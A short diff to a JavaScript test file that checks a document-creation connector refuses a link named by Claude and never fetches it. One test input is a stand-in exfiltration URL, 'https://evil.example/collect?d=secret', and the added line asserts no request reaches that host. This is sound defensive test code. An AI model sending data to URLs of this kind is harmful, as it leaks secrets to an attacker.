@@ -253,6 +253,7 @@ describe("Phase 8a · the one connector", () => {
     // M2: the server never fetches a link Claude names.
     const f = await x.a("create_document", { title: "X", file_name: "x.pdf", pdf_url: "https://evil.example/collect?d=secret" });
     expect(f.error).toBe(true);
+    expect(vi.mocked(fetch).mock.calls.some(([u]) => String(u instanceof Request ? u.url : u).includes("evil.example"))).toBe(false); // nothing fetched
     expect(x.w.t).toBeTruthy();
   });
 });
